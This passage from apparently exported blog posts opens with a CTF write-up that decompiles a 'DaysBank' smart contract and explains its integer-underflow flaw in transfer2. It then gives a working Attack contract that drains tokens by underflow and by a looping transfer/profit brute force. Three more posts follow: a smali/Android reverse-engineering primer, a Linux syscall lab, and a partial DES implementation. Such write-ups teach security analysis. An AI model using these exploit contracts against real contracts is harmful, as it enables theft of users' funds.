balanceOf[msg.sender] += 1 // gift[msg.sender] = 2 memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x00; var temp0 = keccak256(memory[0x00:0x40]); storage[temp0] = storage[temp0] + 0x01; memory[0x20:0x40] = 0x01; storage[keccak256(memory[0x00:0x40])] = 0x02; &#125; function payforflag(var arg0) &#123; // balanceOf[msg.sender] &gt;= 10000 memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x00; if (0x2710 &gt; storage[keccak256(memory[0x00:0x40])]) &#123; revert(memory[0x00:0x00]); &#125; // emit SendFlag(arg0) var var0 = 0xb1bc9a9c599feac73a94c3ba415fa0b75cbe44496bfda818a9b4a689efb7adba; var var1 = 0x01; var temp0 = arg0; var var2 = temp0; var temp1 = memory[0x40:0x60]; var var3 = temp1; memory[var3:var3 + 0x20] = var1; var temp2 = var3 + 0x20; var var4 = temp2; var temp3 = var4 + 0x20; memory[var4:var4 + 0x20] = temp3 - var3; memory[temp3:temp3 + 0x20] = memory[var2:var2 + 0x20]; var var5 = temp3 + 0x20; var var6 = var2 + 0x20; var var7 = memory[var2:var2 + 0x20]; var var8 = var7; var var9 = var5; var var10 = var6; var var11 = 0x00; if (var11 &gt;= var8) &#123; label_02FD: var temp4 = var7; var5 = temp4 + var5; var6 = temp4 &amp; 0x1f; if (!var6) &#123; var temp5 = memory[0x40:0x60]; log(memory[temp5:temp5 + var5 - temp5], [stack[-7]]); return; &#125; else &#123; var temp6 = var6; var temp7 = var5 - temp6; memory[temp7:temp7 + 0x20] = ~(0x0100 ** (0x20 - temp6) - 0x01) &amp; memory[temp7:temp7 + 0x20]; var temp8 = memory[0x40:0x60]; log(memory[temp8:temp8 + (temp7 + 0x20) - temp8], [stack[-7]]); return; &#125; &#125; else &#123; label_02EE: var temp9 = var11; memory[temp9 + var9:temp9 + var9 + 0x20] = memory[temp9 + var10:temp9 + var10 + 0x20]; var11 = temp9 + 0x20; if (var11 &gt;= var8) &#123; goto label_02FD; &#125; else &#123; goto label_02EE; &#125; &#125; &#125; function balanceOf(var arg0) returns (var arg0) &#123; // return balanceOf[arg0] memory[0x20:0x40] = 0x00; memory[0x00:0x20] = arg0; return storage[keccak256(memory[0x00:0x40])]; &#125; function transfer2(var arg0, var arg1) &#123; // arg1 &gt; 2 if (arg1 &lt;= 0x02) &#123; revert(memory[0x00:0x00]); &#125; // balanceOf[msg.sender] &gt; 2 memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x00; if (0x02 &gt;= storage[keccak256(memory[0x00:0x40])]) &#123; revert(memory[0x00:0x00]); &#125; // balanceOf[msg.sender] &gt; arg1 memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x00; if (storage[keccak256(memory[0x00:0x40])] - arg1 &lt;= 0x00) &#123; revert(memory[0x00:0x00]); &#125; // balanceOf[msg.sender] -= arg1 // balanceOf[arg0] += arg1 memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x00; var temp0 = keccak256(memory[0x00:0x40]); var temp1 = arg1; storage[temp0] = storage[temp0] - temp1; memory[0x00:0x20] = arg0 &amp; 0xffffffffffffffffffffffffffffffffffffffff; var temp2 = keccak256(memory[0x00:0x40]); storage[temp2] = temp1 + storage[temp2]; &#125; function transfer(var arg0, var arg1) &#123; // arg1 &gt; 1 if (arg1 &lt;= 0x01) &#123; revert(memory[0x00:0x00]); &#125; // balanceOf[msg.sender] &gt; 1 memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x00; if (0x01 &gt;= storage[keccak256(memory[0x00:0x40])]) &#123; revert(memory[0x00:0x00]); &#125; // balanceOf[msg.sender] &gt; arg1 memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x00; if (arg1 &gt; storage[keccak256(memory[0x00:0x40])]) &#123; revert(memory[0x00:0x00]); &#125; // balanceOf[msg.sender] -= arg1 // balanceOf[arg0] += arg1 memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x00; var temp0 = keccak256(memory[0x00:0x40]); var temp1 = arg1; storage[temp0] = storage[temp0] - temp1; memory[0x00:0x20] = arg0 &amp; 0xffffffffffffffffffffffffffffffffffffffff; var temp2 = keccak256(memory[0x00:0x40]); storage[temp2] = temp1 + storage[temp2]; &#125; function gift(var arg0) returns (var arg0) &#123; // return gift[arg0] memory[0x20:0x40] = 0x01; memory[0x00:0x20] = arg0; return storage[keccak256(memory[0x00:0x40])]; &#125;&#125; 根据上面的分析基本可以还原出原本的合约： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950pragma solidity ^0.4.24;contract DaysBank &#123; mapping(address =&gt; uint) public balanceOf; mapping(address =&gt; uint) public gift; address owner; constructor()public&#123; owner = msg.sender; &#125; function func_01DC() &#123; require(gift[msg.sender] == 0); balanceOf[msg.sender] += 1; gift[msg.sender] = 1; &#125; function profit() &#123; require(balanceOf[msg.sender] == 1); require(gift[msg.sender] == 1); balanceOf[msg.sender] += 1; gift[msg.sender] = 2; &#125; event SendFlag(uint256 flagnum, string b64email); function payforflag(string b64email) public &#123; require(balanceOf[msg.sender] &gt;= 10000); emit SendFlag(1, b64email); &#125; function transfer2(address account, uint value) &#123; require(value &gt; 2); require(balanceOf[msg.sender] &gt; 2); require(balanceOf[msg.sender] - value &gt; 0); balanceOf[msg.sender] -= value; balanceOf[account] += value; &#125; function transfer(address account, uint value) &#123; require(value &gt; 1); require(balanceOf[msg.sender] &gt; 1); require(balanceOf[msg.sender] &gt; value); balanceOf[msg.sender] -= value; balanceOf[account] += value; &#125;&#125; 其中在 transfer2 函数中，进行了 balanceOf[msg.sender] - value &gt; 0 的判断。由于 value 是 uint 类型（默认为 uint256），在转账过程中没有使用 SafeMath，而是直接进行加减操作，显然存在整数溢出漏洞。 还有另外一种做法就是通过两个账户，首先用第一个账户调用 func_01DC() 函数分别将 balanceOf 和 gift 置 1，接下来调用 profit() 函数将余额加 1，然后将余额调用 transfer() 函数转 1 给第二个账户。此时第一个账户的余额又变成了 1，然后又能调用 profit() 函数，如此循环 10000 次（脚本实现）就能达到要求。 Get FlagTODO: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980pragma solidity ^0.4.24;contract DaysBank &#123; mapping(address =&gt; uint) public balanceOf; mapping(address =&gt; uint) public gift; address owner; constructor()public&#123; owner = msg.sender; &#125; function func_01DC() &#123; require(gift[msg.sender] == 0); balanceOf[msg.sender] += 1; gift[msg.sender] = 1; &#125; function profit() &#123; require(balanceOf[msg.sender] == 1); require(gift[msg.sender] == 1); balanceOf[msg.sender] += 1; gift[msg.sender] = 2; &#125; event SendFlag(uint256 flagnum, string b64email); function payforflag(string b64email) public &#123; require(balanceOf[msg.sender] &gt;= 10000); emit SendFlag(1, b64email); &#125; function transfer2(address account, uint value) &#123; require(value &gt; 2); require(balanceOf[msg.sender] &gt; 2); require(balanceOf[msg.sender] - value &gt; 0); balanceOf[msg.sender] -= value; balanceOf[account] += value; &#125; function transfer(address account, uint value) &#123; require(value &gt; 1); require(balanceOf[msg.sender] &gt; 1); require(balanceOf[msg.sender] &gt; value); balanceOf[msg.sender] -= value; balanceOf[account] += value; &#125;&#125;contract Attack &#123; DaysBank target = DaysBank(0x455541c3e9179a6cd8C418142855d894e11A288c); function init() public payable &#123; target.func_01DC(); target.profit(); target.profit(); &#125; function getrich(address account, uint value) public payable &#123; target.transfer2(account, 10001); &#125; function solve() public payable &#123; target.func_01DC(); target.profit(); target.profit(); target.transfer2(0x3356EEedd2A19FBF85a8711e56D0E84caC2FCDBc, 10001); &#125; function bruteforce() public payable &#123; target.func_01DC(); target.profit(); for (uint i = 0; i &lt; 10001; i++) &#123; target.transfer(0x3356EEedd2A19FBF85a8711e56D0E84caC2FCDBc, 1); target.profit(); &#125; &#125;&#125; Referenceshttps://www.pnfsoftware.com/blog/ethereum-smart-contract-decompiler/https://xz.aliyun.com/t/4982https://www.cnblogs.com/hun-ya/p/11414542.html","categories":[],"tags":[{"name":"re","slug":"re","permalink":"qianfei11.coding.me/tags/re/"},{"name":"sol","slug":"sol","permalink":"qianfei11.coding.me/tags/sol/"}]},{"title":"Android逆向入门（一）","slug":"Android逆向入门（一）","date":"2020-01-16T06:41:48.000Z","updated":"2020-02-18T09:11:55.785Z","comments":true,"path":"2020/01/16/Android逆向入门（一）/","link":"","permalink":"qianfei11.coding.me/2020/01/16/Android逆向入门（一）/","excerpt":"开始学习安卓。","text":"开始学习安卓。 APK 的组成 asset 文件夹 资源目录，不需要生成索引，在 Java 代码中需要用 AssetManager 来访问 lib 文件夹 so 库存放位置，一般由 NDK 编译得到，常见于使用游戏引擎或 JNI native 调用的工程中 META-INF 文件夹 存放工程的一些属性文件，例如 Manifest.MF res 文件夹 资源目录，在编译时自动生成索引文件（R.java），在 Java 代码中用 R.xxx.yyy 来引用 AndroidManifest.xml Android 工程的基础配置属性文件（描述 Android 应用的信息，包括类名、组件名等） classes.dex Java 代码编译得到的 Dalvik VM 能直接执行的文件 resources.arsc 对 res 目录下资源的一个索引文件，保存了原工程中 string.xml 等文件内容 其他文件夹 一般来说，除了音频和视频资源（需要放在 raw 或 asset 下），使用 Java 开发的 Android 工程使用到的资源文件都会放在 res 下；使用 C++游戏引擎（或使用 Lua Unity3D 等）的资源文件均需要放在 asset 下。 Dalvik 字节码Dalvik 是谷歌专门为 Android 操作系统设计的一个虚拟机，经过深度的优化。虽然 Android 上的程序是使用 Java 来开发的，但是 Dalvik 和标准的 Java 虚拟机 JVM 还是两回事。Dalvik VM 是基于寄存器的，而 JVM 是基于栈的；Dalvik 有专属的文件执行格式 dex（Dalvik Executable），而 JVM 则执行的是 Java 字节码。Dalvik VM 比 JVM 速度更快，占用空间更少。 Smali 文件结构Smali、Baksmali 分别是指 Android 系统里的 Dalvik 虚拟机所使用的一种 dex 格式文件的汇编器、反汇编器。其语法是一种宽松式的 Jasmin/Dedexer 语法，而且它实现了 dex 格式所有功能（注解、调试信息、线路信息等）。 当我们对 APK 文件进行反编译后，便会生成此类文件。其中在 Dalvik 字节码中，寄存器都是 32 位的，能够支持任何类型，64 位类型（Long/Double）用 2 个寄存器表示；Dalvik 字节码有两种类型：原始类型、引用类型（包括对象和数组）。 头部定义 .class .super .source 域定义 .field public .field static .field private … 函数定义Smali 函数（使用 P-V 寄存器）在 smali 里的所有操作都必须经过寄存器来进行：本地寄存器用 v 开头、数字结尾的符号来表示，如 v0、v1、v2 等；参数寄存器则使用 p 开头、数字结尾的符号来表示，如 p0、p1、p2 等。特别注意的是，p0 不一定是函数中的第一个参数，在非 static 函数中，p0 代指 this，p1 表示函数的第一个参数，p2 代表函数中的第二个参数；而在 static 函数中 p0 才对应第一个参数（因为 Java 的 static 方法中没有 this 方法）。 123456.method 访问修饰符 函数名 函数签名 .locals n # 使用 n 个寄存器，即 v0~v(n-1) .param p1, \"savedInstanceState\" # Landroid/os/Bundle # 注释 ... # 函数实现 return-xxx # 返回.end method 函数调用参数通过寄存器传递（Pn、Vn） 1Invoke&#123;参数&#125;, 方法名 Smali 字段描述符 Java type Type descriptor void V boolean Z char C byte B short S int I float F long J double D Object Ljava/lang/Object; int[] [I byte[] [B Object[][] [[Ljava/lang/Object; Smali 基本语法 Keyword descriptor Description .field private isFlag:z 定义变量 .method 方法 .parameter 方法参数 .prologue 方法开始 .line 123 此方法位于第 123 行 const/high16 v0, 0x7f03 把 0x7f03 赋值给 v0 return-void 函数返回 void .end method 函数结束 new-instance 创建实例 iput-object 对象赋值 iget-object 调用对象 move-result-object 将上一句的结果赋值给寄存器 new-array v0, v1, type 构造指定类型与大小的数组，并赋值给寄存器 array-length v0, v1 获取指定寄存器中数组的长度并赋值给寄存器 const/4 赋值 rem-int/2addr v0, v1 计算模结果存入寄存器 int-to-byte 整型转字节型 goto 直接跳转到指定位置 return-object 返回一个对象类型 Smali 中函数的调用函数分为 direct 和 virtual 两种类型。direct method 就是 private 函数，其余的 public 和 protected 函数都属于 virtual method。 invoke-static调用静态函数。 1invoke-static &#123;v0&#125;, Ljava/lang/System;-&gt;loadLibrary(Ljava/lang/String;)V invoke-super调用父类方法用的指令（一般用于调用 onCreate、onDestroy）。 invoke-direct调用 private 函数。 1invoke-direct &#123;p0&#125;, Landroid/app/TabActivity;-&gt;&lt;init&gt;()V invoke-virtual用于调用 protected 或 public 函数。 1invoke-virtual &#123;v0,v1&#125;, Lcom/ccc;-&gt;Message(Ljava/lang/Object;)V invoke-xxxxx/range当方法参数多于 5 个时（含 5 个），不能直接使用以上指令，而是在后面加上 /range 表示范围。 1invoke-direct/range &#123;v0 .. v5&#125;, Lcmb/pb/ui/PBContainerActivity;-&gt;h(ILjava/lang/CharSequence;Ljava/lang/String;Landroid/content/Intent;I)Z Smali 中的条件跳转分支 代码 含义 if-eq vA, vB, :cond_** 如果 vA 等于 vB 则跳转到 :cond_** if-ne vA, vB, :cond_** 如果 vA 不等于 vB 则跳转到 :cond_** if-lt vA, vB, :cond_** 如果 vA 小于 vB 则跳转到 :cond_** if-ge vA, vB, :cond_** 如果 vA 大于等于 vB 则跳转到 :cond_** if-gt vA, vB, :cond_** 如果 vA 大于 vB 则跳转到 :cond_** if-le vA, vB, :cond_** 如果 vA 小于等于 vB 则跳转到 :cond_** if-eqz vA, :cond_** 如果 vA 等于 0 则跳转到 :cond_** if-nez vA, :cond_** 如果 vA 不等于 0 则跳转到 :cond_** if-ltz vA, :cond_** 如果 vA 小于 0 则跳转到 :cond_** if-gez vA, :cond_** 如果 vA 大于等于 0 则跳转到 :cond_** if-gtz vA, :cond_** 如果 vA 大于 0 则跳转到 :cond_** if-lez vA, :cond_** 如果 vA 小于等于 0 则跳转到 :cond_** Smali 代码编写静态返回 HelloWorld 的方法123456789.class public Lf8/helloworld/helloStr; # 类声明 .super Ljava/lang/Object; # 父类声明 .method public static retHello()Ljava/lang/String; # 函数声明 .locals 1 # 寄存器数量 const-string v0, \"Hello World from StaticMethod\" # 新建字符串 return-object v0 # 返回Object类型.end method # 方法结束声明 返回静态 field 的方法123456.field public static final hStr:Ljava/lang/String; = \"Hello World from static field\" # field声明与初始化.method public static retHello2()Ljava/lang/String; .locals 1 sget-object v0, Lf8/helloworld/helloStr;-&gt;hStr:Ljava/lang/String; # 获取field return-object v0.end method 普通的函数1234567891011.method public constructor &lt;init&gt;()V .locals 0 invoke-direct &#123;p0&#125;, Ljava/lang/Object;-&gt;&lt;init&gt;()V return-void.end method.method public retHello3()Ljava/lang/String; .locals 1 const-string v0, \"Hello World from Method\" return-object v0.end method 普通的 field 与函数1234567891011121314.field public hStr2:Ljava/lang/String;.method public constructor &lt;init&gt;()V .locals 1 invoke-direct &#123;p0&#125;, Ljava/lang/Object;-&gt;&lt;init&gt;()V const-string v0, \"Hello field\" # 初始化非静态field iput-object v0, p0, Lf8/helloworld/helloStr;-&gt;hStr2:Ljava/lang/String; return-void.end method.method public retHello4()Ljava/lang/String; .locals 1 iget-object v0, p0, Lf8/helloworld/helloStr;-&gt;hStr2:Ljava/lang/String; return-object v0.end method 调用时需要先初始化一个实例： 1234new-instance v1, Lf8/helloworld/helloStr;invoke-direct &#123;v1&#125;, Lf8/helloworld/helloStr;-&gt;&lt;init&gt;()Vinvoke-virtual &#123;v1&#125;, Lf8/helloworld/helloStr;-&gt;retHello3()Ljava/lang/String;move-result-object v1 OthersAndroid Log来自于包 android/killer/log。 1invoke-static &#123;v0&#125;, Lcom/android/killer/Log;-&gt;LogStr(Ljava/lang/String;)V LoadLibrary1invoke-static &#123;v0&#125;, Ljava/lang/System;-&gt;loadLibrary(Ljava/lang/String;)V stackTrace打印当前函数堆栈，方法为 Thread.dumpStack()。 1invoke-static &#123;&#125;, Ljava/lang/Thread;-&gt;dumpStack()V Method Trace函数跟踪。 12invoke-static &#123;&#125;, Landroid/os/Debug;-&gt;startMethodTracing()Vinvoke-static &#123;&#125;, Landroid/os/Debug;-&gt;stopMethodTracing()V 需要添加权限。 12&lt;uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\"/&gt;&lt;uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/&gt; 保存的 trace 文件可以 dump 出来使用 monitor 来打开。 字符串处理123456789const-string v1, &quot;%d&quot; # 格式化描述符const/4 v2, 0x1 # 数组长度new-array v2, v2 [Ljava/lang/Object; # 创建Object数组aput-object v3, v2, v4 # 填充数组...invoke-static &#123;v1, v2&#125;, Ljava/lang/String;-&gt;format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String; # 格式化字符串# 字符串替换invoke-virtual &#123;v0, v1, v2&#125;, Ljava/lang/String;-&gt;replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;invoke-virtual &#123;v0, v1, v2&#125;, Ljava/lang/String;-&gt;replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String; waitForDebugger1invoke-static &#123;&#125;, Landroid/os/Debug;-&gt;waitForDebugger()V apktool/ShakaApktool12java -jar apktool.jar d example.apk -o example-dirjava -jar apktool.jar b example-dir -o example.apk 选项 功能 d 反编译 b 回编译 12java -jar ShakaApktool.jar d -df example.apk -o example-dirjava -jar ShakaApktool.jar b example-dir -o example.apk 选项 功能 -df、--default-framework 使用默认的框架资源文件 安卓 apk 调试（不需要修改原 apk 文件） 使用 apktool/ShakaApktool 反编译 apk 文件 在 Android Studio 中导入源码 设置远程调试选项，Host 填写为 localhost，端口填写为 8700 在 Debugger setup 中勾选 Suspend on process entry point、Suspend on thread start/exit 以及 Suspend on library load/unload 使用 adb 以 debug 方式启动 apk：adb shell am start -D -n packageName/ActivityName 下好断点，打开 monitor，开始调试 Referenceshttps://www.bilibili.com/video/av45424886https://www.52pojie.cn/thread-395689-1-1.htmlhttps://www.52pojie.cn/thread-396966-1-1.htmlhttps://www.52pojie.cn/thread-397858-1-1.html","categories":[],"tags":[{"name":"re","slug":"re","permalink":"qianfei11.coding.me/tags/re/"},{"name":"android","slug":"android","permalink":"qianfei11.coding.me/tags/android/"}]},{"title":"如何给Linux添加系统调用","slug":"如何给Linux添加系统调用","date":"2019-11-27T05:50:19.000Z","updated":"2019-12-10T12:35:56.400Z","comments":true,"path":"2019/11/27/如何给Linux添加系统调用/","link":"","permalink":"qianfei11.coding.me/2019/11/27/如何给Linux添加系统调用/","excerpt":"操作系统实验记录。","text":"操作系统实验记录。 EnvironmentOS：Ubuntu 16.04.6 12➜ ~ uname -aLinux ubuntu 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 14:01:10 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux First: Download Linux Kernel Source1234wget https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.20.17.tar.gztar -xvf linux-4.20.17.tar.gzsudo mv linux-4.20.17/ /usr/src/cd /usr/src/linux-4.20.17/ Second: Install Dependences12sudo apt updatesudo apt install bison flex libssl-dev libncurses5-dev Third: Add My Syscall入口（arch/x86/entry/syscalls/syscall_64.tbl） 12# Here are my syscalls548 64 mysyscall sys_mysyscall 系统调用声明（include/linux/syscalls.h） 12// Here are my syscallsasmlinkage long sys_mysyscall(void); 添加调用（kernel/sys.c） 12345// Here are my syscallsasmlinkage long sys_mysyscall(void) &#123; printk(\"Hello Kernel!!!\\n\"); return 1712190426;&#125; Forth: Compile12345678make mrpropermake cleanmake menuconfig # 将Device drivers中的Staging drivers取消# 下面的编译时间比较久 可以通过time记录一下时间time make bzImage # 编译并生成压缩的内核映像 大约半个小时time make modules # 编译模块 大约两个多小时sudo time make modules_install # 安装模块 大约三分多种sudo time make install # 安装内核 大约一分多钟 编译成功后 reboot 重启系统。 Fifth: Test12➜ ~ uname -aLinux ubuntu 4.20.17 #1 SMP Thu Nov 28 22:48:22 PST 2019 x86_64 x86_64 x86_64 GNU/Linux 查看添加的系统调用是否成功： 123➜ ~ grep -A 1 mysyscall /proc/kallsyms0000000000000000 T sys_mysyscall0000000000000000 T usermodehelper_read_unlock 编写测试程序如下： 12345678#include &lt;stdio.h&gt;#include &lt;sys/syscall.h&gt;int main() &#123; long ret = syscall(548); printf(\"%ld\\n\", ret); return 0;&#125; 运行结果，返回值为设定好的值： 12➜ ~ ./31712190426 使用 dmesg 命令（dmesg 命令显示 linux 内核的环形缓冲区信息，我们可以从中获得诸如系统架构、cpu、挂载的硬件，RAM 等多个运行级别的大量的系统信息）查看调用情况： 12➜ ~ dmesg | grep \"Hello\"[ 228.310507] Hello Kernel!!! Referenceshttps://www.cnblogs.com/tod-reg20130101/articles/9280792.htmlhttps://www.zybuluo.com/hakureisino/note/514321https://www.jianshu.com/p/b2d5fa8af581","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"qianfei11.coding.me/tags/linux/"}]},{"title":"Python实现DES、AES加密解密算法","slug":"Python实现DES、AES加密解密算法","date":"2019-11-14T02:09:38.000Z","updated":"2020-02-22T03:49:00.371Z","comments":true,"path":"2019/11/14/Python实现DES、AES加密解密算法/","link":"","permalink":"qianfei11.coding.me/2019/11/14/Python实现DES、AES加密解密算法/","excerpt":"通过实现 DES 和 AES 深入了解对称加密（实现均采用 CBC 模式）。","text":"通过实现 DES 和 AES 深入了解对称加密（实现均采用 CBC 模式）。 DES数据加密标准（英语：Data Encryption Standard，缩写为 DES）是一种对称密钥加密块密码算法，1976 年被美国联邦政府的国家标准局确定为联邦资料处理标准（FIPS），随后在国际上广泛流传开来。它基于使用 56 位密钥的对称算法。这个算法因为包含一些机密设计元素，相对短的密钥长度以及怀疑内含美国国家安全局（NSA）的后门而在开始时有争议，DES 因此受到了强烈的学院派式的审查，并以此推动了现代的块密码及其密码分析的发展。 算法流程DES 是一种典型的块密码—一种将固定长度的明文通过一系列复杂的操作变成同样长度的密文的算法。对 DES 而言，块长度为 64 位。同时，DES 使用密钥来自定义变换过程，因此算法认为只有持有加密所用的密钥的用户才能解密密文。密钥表面上是 64 位的，然而只有其中的 56 位被实际用于算法，其余 8 位可以被用于奇偶校验，并在算法中被丢弃。因此，DES 的有效密钥长度仅为 56 位。 整体结构算法的整体结构中，有 16 个相同的处理过程（round），并在首尾各有一次置换，称为 $IP$ 与 $FP$（或称 $IP^-1$，$FP$ 为 $IP$ 的反函数。$IP$ 和 $FP$ 几乎没有密码学上的重要性，为了在 1970 年代中期的硬件上简化输入输出数据库的过程而被显式的包括在标准中。 在主处理回次前，数据块被分成两个 32 位的半块，并被分别处理；这种交叉的方式被称为费斯妥结构。费斯妥结构保证了加密和解密过程足够相似—唯一的区别在于子密钥在解密时是以反向的顺序应用的，而剩余部分均相同。这样的设计大大简化了算法的实现，尤其是硬件实现，因为没有区分加密和解密算法的需要。 $\\oplus$ 符号代表异或（XOR）操作。“F 函数”将数据半块与某个子密钥进行处理。然后，一个 F 函数的输出与另一个半块异或之后，再与原本的半块组合并交换顺序，进入下一个回次的处理。在最后一个回次完成时，两个半块需要交换顺序，这是费斯妥结构的一个特点，以保证加解密的过程相似。 费斯妥函数（F 函数）费斯妥函数（F 函数）的过程中，其每次对半块（32 位）进行操作，并包括四个步骤： 扩张：用扩张置换（图中的 E）将 32 位的半块扩展到 48 位，其输出包括 8 个 6 位的块，每块包含 4 位对应的输入位，加上两个邻接的块中紧邻的位。 与密钥混合：用异或操作将扩张的结果和一个子密钥进行混合。16 个 48 位的子密钥—每个用于一个回次的 F 变换—是利用密钥调度从主密钥生成的（见下文）。 S 盒：在与子密钥混合之后，块被分成 8 个 6 位的块，然后使用“S 盒”，或称“置换盒”进行处理。8 个 S 盒的每一个都使用以查找表方式提供的非线性的变换将它的 6 个输入位变成 4 个输出位。S 盒提供了 DES 的核心安全性—如果没有 S 盒，密码会是线性的，很容易破解。 置换：最后，S 盒的 32 个输出位利用固定的置换，“P 置换”进行重组。这个设计是为了将每个 S 盒的 4 位输出在下一回次的扩张后，使用 4 个不同的 S 盒进行处理。 S 盒，P 置换和 E 扩张各自满足了克劳德·香农在 1940 年代提出的实用密码所需的必要条件，“混淆与扩散”。 密钥调度加密过程中密钥调度—产生子密钥的算法里，首先使用选择置换 1（PC-1）从 64 位输入密钥中选出 56 位的密钥—剩下的 8 位要么直接丢弃，要么作为奇偶校验位。然后，56 位分成两个 28 位的半密钥；每个半密钥接下来都被分别处理。在接下来的回次中，两个半密钥都被左移 1 或 2 位（由回次数决定），然后通过选择置换 2（PC-2）产生 48 位的子密钥—每个半密钥 24 位。移位（图中由&lt;&lt;标示）表明每个子密钥中使用了不同的位，每个位大致在 16 个子密钥中的 14 个出现。 解密过程中，除了子密钥输出的顺序相反外，密钥调度的过程与加密完全相同。 算法实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178#!/usr/bin/env python# -*- encoding=utf-8 -*-ENCRYPT = 0DECRYPT = 1BLOCK_SIZE = 8# 明文分组初始置换表IP = [58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4, 62, 54, 46, 38, 30, 22, 14, 6, 64, 56, 48, 40, 32, 24, 16, 8, 57, 49, 41, 33, 25, 17, 9, 1, 59, 51, 43, 35, 27, 19, 11, 3, 61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23, 15, 7]# 末置换表IP_ = [40, 8, 48, 16, 56, 24, 64, 32, 39, 7, 47, 15, 55, 23, 63, 31, 38, 6, 46, 14, 54, 22, 62, 30, 37, 5, 45, 13, 53, 21, 61, 29, 36, 4, 44, 12, 52, 20, 60, 28, 35, 3, 43, 11, 51, 19, 59, 27, 34, 2, 42, 10, 50, 18, 58, 26, 33, 1, 41, 9, 49, 17, 57, 25]# S盒压缩置换表（6bit-&gt;4bit）S1 = [14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7, 0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8, 4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0, 15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13]S2 = [15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10, 3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5, 0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15, 13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9]S3 = [10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8, 13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1, 13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7, 1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12]S4 = [7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15, 13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9, 10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4, 3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14]S5 = [2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9, 14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6, 4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14, 11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3]S6 = [12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11, 10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8, 9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6, 4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13]S7 = [4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1, 13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6, 1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2, 6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12]S8 = [13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7, 1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2, 7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8, 2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11]S = [S1, S2, S3, S4, S5, S6, S7, S8]# P盒置换表（32bit）P = [16, 7, 20, 21, 29, 12, 28, 17, 1, 15, 23, 26, 5, 18, 31, 10, 2, 8, 24, 14, 32, 27, 3, 9, 19, 13, 30, 6, 22, 11, 4, 25]# 密钥置换表（64bit-&gt;56bit）PC_1 = [57, 49, 41, 33, 25, 17, 9, 1, 58, 50, 42, 34, 26, 18, 10, 2, 59, 51, 43, 35, 27, 19, 11, 3, 60, 52, 44, 36, 63, 55, 47, 39, 31, 23, 15, 7, 62, 54, 46, 38, 30, 22, 14, 6, 61, 53, 45, 37, 29, 21, 13, 5, 28, 20, 12, 4]# 密钥压缩置换表（56bit-&gt;48bit）PC_2 = [14, 17, 11, 24, 1, 5, 3, 28, 15, 6, 21, 10, 23, 19, 12, 